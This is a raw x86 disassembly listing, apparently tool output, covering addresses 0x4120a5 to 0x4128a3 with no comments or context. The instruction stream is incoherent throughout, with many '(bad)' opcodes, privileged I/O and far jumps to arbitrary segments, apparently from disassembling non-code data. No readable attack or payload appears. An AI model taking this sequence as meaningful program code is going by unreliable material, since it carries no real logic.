  4120a5:	sar    DWORD PTR [eax+0x2e],0x65
  4120a9:	and    cl,BYTE PTR [esi]
  4120ab:	out    0x94,al
  4120ad:	dec    eax
  4120ae:	adc    al,0x5e
  4120b0:	imul   ebp,DWORD PTR [eax-0x11],0xffffffd1
  4120b4:	sub    BYTE PTR [esi+0x4c],cl
  4120b7:	outs   dx,DWORD PTR ds:[esi]
  4120b8:	jecxz  0x41211a
  4120ba:	mov    ds:0x448b70c7,al
  4120bf:	retf   0x7207
  4120c2:	mov    al,0x5
  4120c4:	sbb    esp,DWORD PTR [edx+0x3c]
  4120c7:	pop    esp
  4120c8:	call   0x5b8734de
  4120cd:	aas    
  4120ce:	stos   BYTE PTR es:[edi],al
  4120cf:	jle    0x412062
  4120d1:	popf   
  4120d2:	retf   0x4716
  4120d5:	push   edi
  4120d6:	inc    edi
  4120d7:	rcl    DWORD PTR [ebp+eax*1+0x5e],1
  4120db:	lods   eax,DWORD PTR ds:[esi]
  4120dc:	xor    BYTE PTR [ebp+0x3a],dl
  4120df:	dec    esi
  4120e0:	push   esi
  4120e1:	dec    edi
  4120e2:	mov    bl,0x83
  4120e4:	inc    eax
  4120e5:	fcomip st,st(4)
  4120e7:	(bad)  
  4120e8:	ret    0xceb9
  4120eb:	pop    esp
  4120ec:	(bad)  
  4120ed:	pop    edi
  4120ee:	fsubr  st,st(0)
  4120f0:	and    al,0xe1
  4120f2:	test   DWORD PTR [esi],ebp
  4120f4:	dec    esp
  4120f5:	retf   0xe615
  4120f8:	jecxz  0x41212d
  4120fa:	dec    eax
  4120fb:	mov    ch,0xff
  4120fd:	inc    DWORD PTR [ecx-0x69]
  412100:	clc    
  412101:	fwait
  412102:	jecxz  0x4120df
  412104:	popa   
  412105:	ror    DWORD PTR ds:[ebp-0x5e137523],0x26
  41210d:	adc    eax,ebp
  41210f:	sar    BYTE PTR [eax],cl
  412111:	xchg   ebp,eax
  412112:	pop    ebx
  412113:	fcomp  QWORD PTR ds:0x44157ca6
  412119:	mov    dh,0xe2
  41211b:	mov    dl,0x12
  41211d:	iret   
  41211e:	push   es
  41211f:	mov    dl,0xc0
  412121:	adc    edx,esi
  412123:	xor    al,0x5d
  412125:	and    bl,BYTE PTR [edx+esi*8+0x40ffb60f]
  41212c:	mov    ecx,0x99e7048c
  412131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412132:	in     al,dx
  412133:	push   cs
  412134:	inc    ebp
  412135:	sahf   
  412136:	jnp    0x41214c
  412138:	fcmovne st,st(5)
  41213a:	cmp    al,dh
  41213c:	ins    DWORD PTR es:[edi],dx
  41213d:	mov    bl,0xe3
  41213f:	lock stos BYTE PTR es:[edi],al
  412141:	aad    0x29
  412143:	jge    0x412180
  412145:	int3   
  412146:	mov    cl,0xa0
  412148:	fidiv  WORD PTR [ecx+0x32]
  41214b:	xor    dl,BYTE PTR [eax-0x450d7291]
  412151:	pop    eax
  412152:	aad    0x3f
  412154:	repnz mov BYTE PTR [esp+eiz*8],al
  412158:	outs   dx,DWORD PTR ds:[esi]
  412159:	retf   
  41215a:	xor    ah,BYTE PTR [ebp+edx*2-0x69d5c2de]
  412161:	iret   
  412162:	(bad)  [ebp+esi*8+0x60]
  412166:	push   0x42
  412168:	icebp  
  412169:	int    0xe
  41216b:	inc    ebx
  41216c:	(bad)
  41216f:	or     al,0x7b
  412171:	mov    ds:0x4353b0fa,al
  412176:	(bad)  
  412177:	aaa    
  412178:	lods   al,BYTE PTR ds:[esi]
  412179:	iret   
  41217a:	add    DWORD PTR [edx-0x2b3e5335],ecx
  412180:	jge    0x4121ea
  412182:	mov    cl,BYTE PTR [ecx-0x6f]
  412185:	mov    bh,0xed
  412187:	and    DWORD PTR ds:0x401792ff,eax
  41218d:	fld    QWORD PTR [eax-0x673d38ac]
  412193:	inc    esi
  412194:	add    eax,0xea4f0684
  412199:	mov    ds:0xf69306b4,eax
  41219e:	fdivr  st(2),st
  4121a0:	pop    esp
  4121a1:	gs inc edi
  4121a3:	(bad)  
  4121a4:	cmp    eax,0x3e49ddf0
  4121a9:	fnstenv [esi+0x24]
  4121ac:	fisub  WORD PTR [ebx+ebp*8-0x4563fe4b]
  4121b3:	rcr    DWORD PTR [eax+0x45326a54],cl
  4121b9:	dec    ebx
  4121ba:	vpsrld ymm1,ymm0,xmm1
  4121be:	ffreep st(5)
  4121c0:	imul   eax,DWORD PTR [edi],0xffffffa0
  4121c3:	dec    edx
  4121c4:	sub    BYTE PTR [ebx],bh
  4121c6:	mov    al,0xd6
  4121c8:	call   0xc587:0xe0f24dec
  4121cf:	test   eax,0xd3baab05
  4121d4:	sbb    ah,BYTE PTR [edi+0x1b6379d5]
  4121da:	sub    DWORD PTR ds:0xe31a18bc,ebx
  4121e0:	adc    DWORD PTR [esp+ebx*4+0x5e],0x3a4e8426
  4121e8:	jb     0x4121c9
  4121ea:	repnz push edx
  4121ec:	adc    dl,BYTE PTR [edx-0x55]
  4121ef:	ja     0x4121dd
  4121f1:	xor    cl,cl
  4121f3:	jge    0x41225d
  4121f5:	jnp    0x412204
  4121f7:	adc    al,0x1f
  4121f9:	dec    ecx
  4121fa:	mov    dh,0x23
  4121fc:	xor    al,0x23
  4121fe:	out    dx,eax
  4121ff:	sub    al,0x19
  412201:	and    BYTE PTR [edx+0x50847c83],al
  412207:	cmp    ch,BYTE PTR [edi+0x1f]
  41220a:	stos   DWORD PTR es:[edi],eax
  41220b:	cmp    bh,0x44
  41220e:	or     al,0xfa
  412210:	sub    al,0x5f
  412212:	jmp    0x412291
  412214:	ret    
  412215:	add    DWORD PTR [ebp+0x25],ebx
  412218:	add    esi,DWORD PTR [ebx-0x79924bda]
  41221e:	cld    
  41221f:	in     al,dx
  412220:	xor    edx,0x75275489
  412226:	retf   0x9ec6
  412229:	and    eax,0x1bc9cd7b
  41222e:	mov    al,fs:0xb133e394
  412234:	sub    cl,0x38
  412237:	fcomp  QWORD PTR cs:[edi+0x71]
  41223b:	xchg   ecx,eax
  41223c:	cli    
  41223d:	push   ss
  41223e:	out    dx,al
  41223f:	leave  
  412240:	aad    0x11
  412242:	mov    esp,DWORD PTR [ebp-0x72]
  412245:	aam    0x2d
  412247:	leave  
  412248:	mov    bl,BYTE PTR [eax+0x26]
  41224b:	(bad)  
  41224c:	in     eax,0xa0
  41224e:	mov    eax,ds:0xad218f6f
  412253:	cmp    al,0xfb
  412255:	neg    edx
  412257:	jae    0x4121e5
  412259:	loopne 0x412236
  41225b:	call   0x6f0f:0xc75ad115
  412262:	mov    cl,0x88
  412264:	in     al,0xa5
  412266:	test   al,0xaa
  412268:	aaa    
  412269:	int3   
  41226a:	(bad)  
  41226b:	lods   eax,DWORD PTR ds:[esi]
  41226c:	pop    edi
  41226d:	sub    eax,0x35c50624
  412272:	fsub   DWORD PTR [ecx]
  412274:	push   eax
  412275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412276:	inc    ebx
  412277:	mov    al,ds:0xffedbcc5
  41227c:	lock dec ebx
  41227e:	jmp    0x7114:0x4cb6f7d2
  412285:	out    dx,al
  412286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412287:	(bad)  
  412288:	in     eax,0x67
  41228a:	std    
  41228b:	jae    0x4122e6
  41228d:	std    
  41228e:	or     DWORD PTR [esi+0x41],edi
  412291:	lods   al,BYTE PTR ds:[esi]
  412292:	hlt    
  412293:	inc    esp
  412295:	mov    eax,ds:0x9e696dce
  41229a:	mov    edx,DWORD PTR [ebx+ecx*8+0x6c]
  41229e:	lock (bad) 
  4122a0:	mov    ebx,0xe4db0ab5
  4122a5:	sahf   
  4122a6:	test   eax,0xf35105e9
  4122ab:	outs   dx,BYTE PTR ds:[esi]
  4122ac:	xchg   esp,eax
  4122ad:	jp     0x412286
  4122af:	push   es
  4122b0:	xlat   BYTE PTR ds:[ebx]
  4122b1:	or     BYTE PTR [eax-0x1a84e269],ah
  4122b7:	test   BYTE PTR [ebx+0x79c17f0c],bl
  4122bd:	pop    edx
  4122be:	push   DWORD PTR [eax+0x5a]
  4122c1:	push   esp
  4122c2:	fldcw  WORD PTR [si-0x3e3d]
  4122c7:	ficom  DWORD PTR gs:[ebp+0x6f]
  4122cb:	pop    esp
  4122cc:	push   esi
  4122cd:	cmc    
  4122ce:	mov    WORD PTR [ecx],gs
  4122d0:	add    edx,edi
  4122d2:	cdq    
  4122d3:	loopne 0x412327
  4122d5:	test   eax,0x7a8f52ee
  4122da:	leave  
  4122db:	inc    edi
  4122dc:	jb     0x412320
  4122de:	dec    esp
  4122df:	inc    esp
  4122e0:	sbb    eax,0x39780549
  4122e5:	push   es
  4122e6:	stos   BYTE PTR es:[edi],al
  4122e7:	arpl   ax,ax
  4122e9:	add    eax,0x1ae69b03
  4122ee:	(bad)  
  4122ef:	(bad)  
  4122f1:	int3   
  4122f2:	inc    ebx
  4122f3:	dec    eax
  4122f4:	mov    eax,ds:0x547e68ce
  4122f9:	mov    dh,0xce
  4122fb:	xchg   esp,eax
  4122fc:	pop    ebp
  4122fd:	pop    ds
  4122fe:	adc    edi,edi
  412300:	stos   BYTE PTR es:[edi],al
  412301:	pop    ecx
  412302:	sbb    DWORD PTR [eax+0x41],edx
  412305:	jmp    0x4122a4
  412307:	and    ch,BYTE PTR [edi+0x55]
  41230a:	jo     0x41231f
  41230c:	adc    DWORD PTR [ebp-0x132c876a],edx
  412312:	push   ss
  412313:	aaa    
  412314:	lds    ecx,FWORD PTR [edi+0x46a509ea]
  41231a:	or     BYTE PTR [ebp+0x21],0x66
  41231e:	jnp    0x4122c5
  412320:	sahf   
  412321:	fmul   QWORD PTR [edx-0x79803c5c]
  412327:	sbb    ah,dh
  412329:	(bad)  
  41232a:	mov    esp,0xfd96ff29
  41232f:	jg     0x4123a6
  412331:	loope  0x412396
  412333:	rcr    BYTE PTR [edi-0x36],1
  412336:	out    dx,al
  412337:	outs   dx,DWORD PTR ds:[esi]
  412338:	and    BYTE PTR [edx],0x14
  41233b:	call   DWORD PTR [edx-0x7d269bd4]
  412341:	js     0x41231a
  412343:	retf   0xa651
  412346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412347:	ins    DWORD PTR es:[edi],dx
  412348:	push   ds
  412349:	mov    ah,BYTE PTR [edi-0x34]
  41234c:	clc    
  41234d:	fcmovu st,st(5)
  41234f:	push   edx
  412350:	test   cl,bh
  412352:	mov    ebp,0x947df361
  412357:	or     DWORD PTR [ecx-0x55],esi
  41235a:	in     eax,0x6
  41235c:	push   ebp
  41235d:	sub    edi,ecx
  41235f:	sti    
  412360:	mov    ds:0xdcc9e8c2,eax
  412365:	adc    esp,DWORD PTR [edx]
  412367:	addr16 jg 0x4123bd
  41236a:	jmp    0x4123c6
  41236c:	adc    eax,0x862cb2b0
  412371:	in     al,dx
  412372:	shl    DWORD PTR [edx],1
  412374:	outs   dx,DWORD PTR ds:[esi]
  412375:	cmp    eax,0x93e57bde
  41237a:	mov    al,ds:0x7e760794
  41237f:	lahf   
  412380:	stc    
  412381:	mov    ah,0x2b
  412383:	jl     0x41236e
  412385:	adc    BYTE PTR [edx],0x91
  412388:	cmp    al,bl
  41238a:	xchg   esi,eax
  41238b:	(bad)  [esi+0x73efff9d]
  412391:	lods   al,BYTE PTR ds:[esi]
  412392:	mov    dh,0xd
  412394:	gs jns 0x412366
  412397:	sub    eax,0x2289ff87
  41239c:	sub    DWORD PTR [esi+0x8a84b91],0xffffff9b
  4123a3:	fsubr  QWORD PTR [edx-0x15573da8]
  4123a9:	cmp    BYTE PTR [ebx],bh
  4123ab:	pop    es
  4123ac:	jbe    0x4123c8
  4123ae:	(bad)  
  4123af:	cwde   
  4123b0:	fild   WORD PTR [ebp+0x7f6bd7d3]
  4123b6:	sbb    bh,BYTE PTR [eax]
  4123b8:	jecxz  0x412351
  4123ba:	pop    esi
  4123bb:	shl    BYTE PTR [ebp+0x2e008d9e],1
  4123c1:	push   cs
  4123c2:	cmp    BYTE PTR [eax],dh
  4123c4:	sub    BYTE PTR [edx-0xc],bl
  4123c7:	ja     0x4123f5
  4123c9:	jae    0x4123d3
  4123cb:	pop    ebp
  4123cc:	inc    ebx
  4123cd:	jns    0x412428
  4123cf:	and    ebp,DWORD PTR [ebx-0x3c]
  4123d2:	ins    DWORD PTR es:[edi],dx
  4123d3:	sbb    DWORD PTR [edx-0x61ba6755],edx
  4123d9:	mov    bh,0xf1
  4123db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123dc:	js     0x4123d8
  4123de:	xchg   ebp,eax
  4123df:	jb     0x4123c8
  4123e1:	ins    DWORD PTR es:[edi],dx
  4123e2:	sub    al,0x62
  4123e4:	adc    bh,BYTE PTR es:[ecx+0x781e2dee]
  4123eb:	test   eax,0x2cce3b0e
  4123f0:	push   esi
  4123f1:	push   edx
  4123f2:	sti    
  4123f3:	jb     0x41246e
  4123f5:	jbe    0x4123e1
  4123f7:	fldz   
  4123f9:	dec    ebx
  4123fa:	ficom  DWORD PTR [eax+0x7d699e70]
  412400:	jns    0x412472
  412402:	adc    eax,0x9da15995
  412407:	jecxz  0x4123d3
  412409:	cwde   
  41240a:	out    dx,eax
  41240b:	cmp    DWORD PTR [esi-0x31],0xffffffb6
  41240f:	sub    ecx,DWORD PTR [edx+0x39]
  412412:	or     ebp,DWORD PTR [ebp+0x7de7b9c0]
  412418:	xor    esp,DWORD PTR [eax+edi*2]
  41241b:	aaa    
  41241c:	les    edi,FWORD PTR [ecx+0x56]
  41241f:	pop    ss
  412420:	add    eax,0xdb43bb74
  412425:	clc    
  412426:	outs   dx,DWORD PTR ds:[esi]
  412427:	neg    BYTE PTR [ebx+ebp*1]
  41242a:	out    0x5,eax
  41242c:	sub    DWORD PTR [edi-0x6d6a190f],esp
  412432:	xor    eax,DWORD PTR [ecx-0x2d]
  412435:	mov    edx,0x985eac97
  41243a:	jne    0x412471
  41243c:	mov    WORD PTR [ecx+0x36e6f769],es
  412442:	pop    ebp
  412443:	(bad)  
  412445:	dec    edi
  412446:	jb     0x412455
  412448:	ror    DWORD PTR gs:[edi+0x6a507cde],1
  41244f:	pop    es
  412450:	es loopne 0x41248a
  412453:	cwde   
  412454:	mov    eax,DWORD PTR [edi]
  412456:	xor    BYTE PTR [edi-0x24],dl
  412459:	pop    eax
  41245a:	jbe    0x4124c8
  41245c:	push   edi
  41245d:	mov    esp,0xb0f91511
  412462:	sbb    eax,0xabee21ef
  412467:	push   es
  412468:	je     0x4123ec
  41246a:	aam    0xe3
  41246c:	mov    eax,ds:0x1529b63d
  412471:	mov    bl,0x4e
  412473:	sub    dl,bh
  412475:	aaa    
  412476:	mov    ch,0x34
  412478:	push   cs
  412479:	rcl    BYTE PTR [eax+0xe],1
  41247c:	pop    ss
  41247d:	push   eax
  41247e:	push   cs
  41247f:	(bad)  
  412481:	fcomp  QWORD PTR [edx+0x71]
  412484:	dec    esi
  412485:	addr16 mov cl,0xd8
  412488:	lea    esp,[eax+0x7b]
  41248b:	xchg   edx,eax
  41248c:	(bad)  
  41248d:	das    
  41248e:	jbe    0x412495
  412490:	sahf   
  412491:	fcomp  st(5)
  412493:	sbb    BYTE PTR [esi+0x12],ch
  412496:	xchg   ebx,eax
  412497:	and    BYTE PTR [ecx+edi*8+0x3c],al
  41249b:	outs   dx,BYTE PTR ds:[esi]
  41249c:	test   BYTE PTR [edi+eax*2+0x1cc7ba2b],cl
  4124a3:	(bad)  
  4124a4:	jmp    0xe4658954
  4124a9:	sbb    DWORD PTR [esp+ebx*8-0x6dbae16c],esp
  4124b0:	iret   
  4124b1:	std    
  4124b2:	popa   
  4124b3:	adc    DWORD PTR [ecx-0x4879d76],ebx
  4124b9:	aam    0x37
  4124bb:	outs   dx,DWORD PTR ds:[esi]
  4124bc:	imul   esi,DWORD PTR [ebp-0x1fea9de8],0xffffffe9
  4124c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124c4:	adc    eax,0x5c0edc4e
  4124c9:	xor    al,0x40
  4124cb:	mov    ch,BYTE PTR [esi-0x51cf7d1]
  4124d1:	push   esi
  4124d2:	push   es
  4124d3:	jecxz  0x4124bb
  4124d5:	adc    dh,dh
  4124d7:	or     al,0xf5
  4124d9:	repz pop esi
  4124db:	sbb    esp,DWORD PTR [ecx]
  4124dd:	adc    DWORD PTR [ebx],edi
  4124df:	add    eax,0xd7785086
  4124e5:	out    dx,eax
  4124e6:	(bad)  
  4124e7:	sub    esi,ebp
  4124e9:	mov    eax,ds:0xd853b65c
  4124ee:	scas   eax,DWORD PTR es:[edi]
  4124ef:	xor    al,0xbf
  4124f1:	jge    0x4124d4
  4124f3:	sbb    al,0x2e
  4124f5:	icebp  
  4124f6:	scas   eax,DWORD PTR es:[edi]
  4124f7:	push   ecx
  4124f8:	push   eax
  4124f9:	sub    DWORD PTR [ecx+0x4cdcbe31],esp
  4124ff:	mov    ds:0xbeb0ade5,eax
  412504:	jmp    FWORD PTR [ebx]
  412506:	mov    bl,0x3a
  412508:	and    edi,ecx
  41250a:	pop    edx
  41250b:	push   edi
  41250c:	sbb    dh,BYTE PTR [esi-0x2a]
  41250f:	and    al,0x39
  412511:	pop    ds
  412512:	jbe    0x4124cf
  412514:	ret    0x81ff
  412517:	mov    edi,0xad5010ff
  41251c:	jg     0x412505
  41251e:	xor    bl,BYTE PTR ds:0xd65f1c90
  412524:	lods   al,BYTE PTR ds:[esi]
  412525:	cmp    eax,0x6bb34f6
  41252a:	(bad)  
  41252c:	mov    DWORD PTR [ebx],ecx
  41252e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41252f:	dec    eax
  412530:	je     0x4124b8
  412532:	add    al,0xac
  412534:	ficom  WORD PTR [edx]
  412536:	lods   eax,DWORD PTR ds:[esi]
  412537:	popf   
  412538:	xchg   edi,eax
  412539:	jmp    0xd550:0x3368a426
  412540:	out    dx,eax
  412541:	sub    DWORD PTR [edi],ebp
  412543:	xchg   ecx,eax
  412544:	mov    esi,0xdd2e5334
  412549:	xor    ecx,DWORD PTR [esi]
  41254b:	pop    esp
  41254c:	mov    ah,BYTE PTR [esi]
  41254e:	imul   esp,ecx,0xf6618836
  412554:	mov    edi,0x42f16f81
  412559:	ret    
  41255a:	adc    ebx,DWORD PTR [eax]
  41255c:	cmc    
  41255d:	aam    0x9d
  41255f:	loop   0x4125c5
  412561:	push   ecx
  412562:	pop    ebx
  412563:	or     al,0xe3
  412565:	rcr    BYTE PTR [eax-0xa],1
  412568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412569:	ja     0x4124f9
  41256b:	sub    BYTE PTR [edi+edx*1-0x6c27fe19],ch
  412572:	sub    eax,0x943d9b7c
  412577:	pop    eax
  412578:	inc    ebx
  412579:	sbb    dh,bh
  41257b:	jp     0x412515
  41257d:	(bad)  
  41257e:	and    ebx,DWORD PTR [edx-0x7b2c682f]
  412584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412585:	xor    ebp,DWORD PTR [esi-0x5b684b4d]
  41258b:	mov    dh,0xec
  41258d:	retf   
  41258e:	or     al,0x71
  412590:	sub    eax,0x141b2364
  412595:	fldcw  WORD PTR [edx*2+0x32732920]
  41259c:	jp     0x412615
  41259e:	and    eax,DWORD PTR [ecx-0x32c1083b]
  4125a4:	sti    
  4125a5:	lds    edi,FWORD PTR [esi-0x72]
  4125a8:	sbb    eax,0xb72ff51d
  4125ad:	jno    0x4125bc
  4125af:	test   al,0xa4
  4125b1:	add    esp,edx
  4125b3:	cwde   
  4125b4:	pop    ebp
  4125b5:	(bad)  
  4125b6:	loopne 0x41256f
  4125b8:	icebp  
  4125b9:	mov    ah,0x76
  4125bb:	dec    edi
  4125bc:	pushf  
  4125bd:	inc    ebx
  4125be:	push   ds
  4125bf:	cmp    DWORD PTR [ebp-0x75111190],eax
  4125c5:	rcl    DWORD PTR [esp+eax*8-0x80],0xae
  4125ca:	data16 sbb al,BYTE PTR [ecx]
  4125cd:	jg     0x41258b
  4125cf:	mov    edx,0x1a1966aa
  4125d4:	adc    DWORD PTR [ebx+0x53fa8bb2],eax
  4125da:	fistp  WORD PTR [eax+ebp*8]
  4125dd:	mov    DWORD PTR [ebx-0x52],esp
  4125e0:	inc    ebp
  4125e1:	sub    dl,BYTE PTR [eax+0x7efaee7d]
  4125e7:	xchg   DWORD PTR [ebx-0x1b4a2e27],ebp
  4125ed:	pop    esp
  4125ee:	push   ecx
  4125ef:	in     al,dx
  4125f0:	call   0xd1933d69
  4125f5:	call   0x975c:0x35bcdd14
  4125fc:	data16 jle 0x4125dd
  4125ff:	add    dl,dl
  412601:	xor    eax,DWORD PTR ds:0xcc4b073e
  412607:	dec    ebx
  412608:	mov    ecx,0xbe4085b0
  41260d:	mov    al,0x1
  41260f:	and    cl,ah
  412611:	pop    ebx
  412612:	sub    bl,ah
  412614:	mov    al,0x76
  412616:	pop    edi
  412617:	test   al,0x77
  412619:	pusha  
  41261a:	pop    esi
  41261b:	stc    
  41261c:	inc    ebp
  41261d:	leave  
  41261e:	or     DWORD PTR [esi+0x7f4839c5],edi
  412624:	mov    ecx,DWORD PTR [ebx+0x3e76c58e]
  41262a:	shr    DWORD PTR [edi+0x894eed],0xd7
  412631:	mov    cl,0xa5
  412633:	jle    0x41266b
  412635:	cmp    DWORD PTR ds:0x2aa51f5c,eax
  41263b:	scas   al,BYTE PTR es:[edi]
  41263c:	mov    ebx,0x758c89b6
  412641:	push   0x23
  412643:	sar    BYTE PTR [esi+0x3f],cl
  412646:	mov    eax,0x23d87bc2
  41264b:	popa   
  41264c:	or     cl,bh
  41264e:	shl    DWORD PTR [ebp-0x1c28130c],cl
  412654:	jns    0x4125da
  412656:	cld    
  412657:	xor    esi,DWORD PTR [eax]
  412659:	xlat   BYTE PTR ds:[ebx]
  41265a:	loopne 0x41266b
  41265c:	jmp    0x4125f9
  41265e:	out    dx,al
  41265f:	xor    DWORD PTR [ebx+0x46],0xdc334360
  412666:	push   ebx
  412667:	inc    edi
  412668:	imul   eax,DWORD PTR [ecx],0x15ff5cf9
  41266e:	mov    esp,0x1c88c68f
  412673:	push   edi
  412674:	call   DWORD PTR [ebx]
  412676:	cs loopne 0x4126f0
  412679:	dec    ebx
  41267a:	and    BYTE PTR [edi+eax*4],0xca
  41267e:	pop    es
  41267f:	jmp    0xb31891eb
  412684:	dec    eax
  412685:	out    0xa6,al
  412687:	(bad)  
  412688:	test   al,0x5
  41268a:	scas   eax,DWORD PTR es:[edi]
  41268b:	jmp    0x7b3246a2
  412690:	shr    DWORD PTR [ecx+edx*2+0x9],cl
  412694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412695:	xor    edx,DWORD PTR [ecx+0xcfdb9f8]
  41269b:	jge    0x41270b
  41269d:	mov    edx,0x1fe4d7a6
  4126a2:	mov    bh,0x89
  4126a4:	dec    eax
  4126a5:	jnp    0x41265f
  4126a7:	call   0xe563dfd
  4126ac:	inc    ebx
  4126ad:	jno    0x412702
  4126af:	mov    bl,0x1c
  4126b1:	add    al,0x1c
  4126b3:	mov    fs,ebx
  4126b5:	test   BYTE PTR [edi-0x2b],dh
  4126b8:	loope  0x4126b0
  4126ba:	scas   eax,DWORD PTR es:[edi]
  4126bb:	and    bl,al
  4126bd:	les    ebx,FWORD PTR [ebp-0x5e]
  4126c0:	add    dh,BYTE PTR [esi+ecx*4-0x30b3f722]
  4126c7:	dec    eax
  4126c8:	mov    ?,WORD PTR [edi+0x26b39e65]
  4126ce:	push   ss
  4126cf:	loopne 0x412663
  4126d1:	(bad)  
  4126d3:	sbb    al,0x38
  4126d5:	xlat   BYTE PTR ds:[ebx]
  4126d6:	fs pop esp
  4126d8:	jmp    0x4f24:0xe3dd6a92
  4126df:	mov    dl,0xb6
  4126e1:	mov    ecx,0x93210eea
  4126e6:	xor    ch,dl
  4126e8:	mov    ds:0x75634a7e,al
  4126ed:	jb     0x4126ff
  4126ef:	add    eax,0xe03abf44
  4126f4:	stos   BYTE PTR es:[edi],al
  4126f5:	aad    0x37
  4126f7:	xchg   ecx,eax
  4126f8:	mov    ch,0xf7
  4126fa:	add    DWORD PTR [esp+edx*4],eax
  4126fd:	loope  0x412757
  4126ff:	mov    BYTE PTR [esi],al
  412701:	rol    DWORD PTR [edx*8+0x31d7453a],0x5c
  412709:	vpaddd ymm5,ymm7,ymm4
  41270d:	jo     0x412736
  41270f:	enter  0xc642,0xc0
  412713:	push   ds
  412714:	(bad)  
  412715:	cmp    BYTE PTR [edi],al
  412717:	les    eax,FWORD PTR [edx+0x9]
  41271a:	mov    ds:0x91cc4f48,al
  41271f:	pop    eax
  412720:	hlt    
  412721:	mov    esi,0x75cae46
  412726:	dec    eax
  412727:	mov    ah,0x65
  412729:	loopne 0x41275e
  41272b:	mov    edi,DWORD PTR [ecx+0x22]
  41272e:	cwde   
  41272f:	ror    DWORD PTR [edx-0x7],0xce
  412733:	aad    0xdf
  412735:	mov    bh,0x6d
  412737:	sbb    edi,DWORD PTR [ebp-0x619951b8]
  41273d:	mov    DWORD PTR [eax],0xff7e1906
  412743:	sbb    eax,0x1250c672
  412748:	sub    BYTE PTR [ebp-0x6372385c],ch
  41274e:	mov    ch,0x4e
  412750:	outs   dx,DWORD PTR ds:[esi]
  412751:	dec    esp
  412752:	xchg   esp,eax
  412753:	bound  esi,QWORD PTR [edx+edi*2+0x35c85d8e]
  41275a:	aas    
  41275b:	ja     0x4126e0
  41275d:	es sbb al,0x7a
  412760:	jecxz  0x412713
  412762:	call   0x849d:0x120e7628
  412769:	adc    ch,BYTE PTR ds:0xad339d32
  41276f:	in     eax,dx
  412770:	mov    ds:0x2e60bc64,eax
  412775:	xchg   edx,eax
  412776:	jnp    0x41277e
  412778:	mov    ds:0x91ac8d88,al
  41277d:	jmp    0x412724
  41277f:	adc    BYTE PTR [esp+edx*1-0x640bdb5a],cl
  412786:	jbe    0x412800
  412788:	in     al,0x4d
  41278a:	sbb    ebp,edi
  41278c:	mov    DWORD PTR [ecx],ebp
  41278e:	inc    esi
  41278f:	test   DWORD PTR [edx-0x4c],edx
  412792:	in     al,0x8e
  412794:	cmp    esi,esi
  412796:	(bad)  
  412798:	pop    esp
  412799:	mov    edi,0x485d7e54
  41279e:	data16 adc ah,BYTE PTR [esp+edx*1+0x7d3ef6d3]
  4127a6:	jno    0x412769
  4127a8:	retf   0x5d9f
  4127ab:	adc    ebp,DWORD PTR [edi+0xa]
  4127ae:	stos   DWORD PTR es:[edi],eax
  4127af:	inc    esp
  4127b0:	pop    esp
  4127b1:	inc    eax
  4127b2:	mov    ebx,0x70d4dc6e
  4127b7:	jp     0x412777
  4127b9:	les    esi,FWORD PTR [esi-0x37329331]
  4127bf:	mov    dh,0xb0
  4127c1:	hlt    
  4127c2:	dec    edi
  4127c3:	in     eax,0x26
  4127c5:	mov    eax,ds:0x5e224233
  4127ca:	ds push ebp
  4127cc:	imul   esp,DWORD PTR [ecx-0x1b78d68d],0x972a60b
  4127d6:	mov    esp,0xdfcea82d
  4127db:	lds    ecx,FWORD PTR [ebp+ebx*8+0x6b4d9ec9]
  4127e2:	dec    esi
  4127e3:	in     al,dx
  4127e4:	xchg   edi,eax
  4127e5:	jns    0x412831
  4127e7:	arpl   WORD PTR [eax+ebx*2-0x7c],si
  4127eb:	sub    DWORD PTR [ecx+eiz*8+0x24],0xfc05487f
  4127f3:	mov    ecx,0xc18c319d
  4127f8:	add    ebp,0x2cebdeaf
  4127fe:	jp     0x412816
  412800:	mov    WORD PTR [di-0x8],ds
  412804:	hlt    
  412805:	sbb    dh,BYTE PTR [edi]
  412807:	mov    ebp,0x5ea72f56
  41280c:	xor    BYTE PTR [ebp-0x731eb61e],bl
  412812:	(bad)
  412815:	dec    esi
  412816:	(bad)  
  412817:	add    ch,ch
  412819:	push   es
  41281a:	mov    ecx,0x81c11f7b
  41281f:	ss mov eax,0xed692bfc
  412825:	dec    ebx
  412826:	hlt    
  412827:	rol    BYTE PTR [esi],0x75
  41282a:	xchg   ecx,eax
  41282b:	xchg   ebp,eax
  41282c:	pop    ds
  41282d:	pop    ebx
  41282e:	jne    0x4127d5
  412830:	je     0x4128a6
  412832:	push   ss
  412833:	rcl    ch,1
  412835:	mov    bl,0x7c
  412837:	push   ds
  412838:	pop    ecx
  412839:	pop    ebp
  41283a:	ds dec eax
  41283c:	in     eax,dx
  41283d:	and    BYTE PTR [edi+0x71d30636],ah
  412843:	lea    ecx,[ecx-0x398c24d4]
  412849:	daa    
  41284a:	ja     0x412888
  41284c:	cmp    al,BYTE PTR [ebx-0x1f]
  41284f:	out    dx,eax
  412850:	(bad)  
  412851:	addr16 mov cl,0xe1
  412854:	ror    BYTE PTR [ecx],0xbc
  412857:	sbb    BYTE PTR [ecx+0x4ddd9b5f],dl
  41285d:	xor    DWORD PTR [ebp+edi*1-0x42],eax
  412861:	outs   dx,DWORD PTR ds:[esi]
  412862:	push   edx
  412863:	call   0x6cf4:0xd8dec3f3
  41286a:	sbb    DWORD PTR [edi+0x19f34ee9],esp
  412870:	lahf   
  412871:	and    DWORD PTR [edx+0x68],ecx
  412874:	fst    DWORD PTR [esi-0x54]
  412877:	lods   al,BYTE PTR ds:[esi]
  412878:	mov    cl,0xd1
  41287a:	push   esp
  41287b:	je     0x41289b
  41287d:	jl     0x4128e4
  41287f:	jg     0x4128fe
  412881:	mov    eax,ds:0x8acb7465
  412886:	rcl    BYTE PTR [ecx-0x35],0x56
  41288a:	mov    edx,0x5f7ab903
  41288f:	jmp    0x4128d8
  412891:	sub    eax,0x18f709aa
  412896:	and    eax,0xe07c1b19
  41289b:	mov    cl,0xd5
  41289d:	mov    ds:0xfd6f4a5b,eax
  4128a2:	cwde   
  4128a3:	sub    ebx,esp
